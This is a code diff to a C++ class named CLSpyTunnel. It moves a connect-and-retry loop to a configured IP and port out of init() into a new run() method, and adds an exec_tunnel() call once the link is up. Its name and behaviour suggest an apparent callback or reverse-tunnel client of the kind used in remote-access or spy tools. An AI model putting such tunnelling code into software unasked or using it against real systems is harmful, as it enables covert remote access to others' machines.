@@ -1,9 +1,6 @@
 #include "clspytunnel.hpp"
 
-int CLSpyTunnel::init(char* __ip, const uint __port, int* __p_shutdown_flag) {
-    int rc;
-    int error = 0;
-    socklen_t len = sizeof(error);
+int CLSpyTunnel::init(char* __ip, const uint __port, bool* __p_shutdown_flag) {
     ip_ = __ip;
     port_ = __port;
     p_shutdown_flag_ = __p_shutdown_flag;
@@ -17,13 +14,21 @@ int CLSpyTunnel::init(char* __ip, const uint __port, int* __p_shutdown_flag) {
         return -1;
     }
 
+    return 0;
+}
+
+void CLSpyTunnel::run() {
+    int rc;
+    int error = 0;
+    socklen_t len = sizeof(error);
+    
     while (!*p_shutdown_flag_) {
         retry_flag_ = false;
         
         socket_ = socket(AF_INET, get_conn_type(), 0);
         if (socket_ < 0) {
             printf("Socket creation failed: %s\n", strerror(errno));
-            return -1;
+            return;
         }
         rc = connect(socket_, (struct sockaddr*) &server_addr_, sizeof(server_addr_));
         if (rc < 0) {
@@ -32,7 +37,7 @@ int CLSpyTunnel::init(char* __ip, const uint __port, int* __p_shutdown_flag) {
                 goto retry;
             } else {
                 printf("Connection failed: %s\n", strerror(errno));
-                return -1;
+                return;
             }
         }
 
@@ -45,6 +50,7 @@ int CLSpyTunnel::init(char* __ip, const uint __port, int* __p_shutdown_flag) {
         while (!retry_flag_ && !*p_shutdown_flag_) {
             // Connection successful
             retry_flag_ = send_out(socket_, EXEC_SUCCESS);
+            exec_tunnel();
         }
 
         retry:
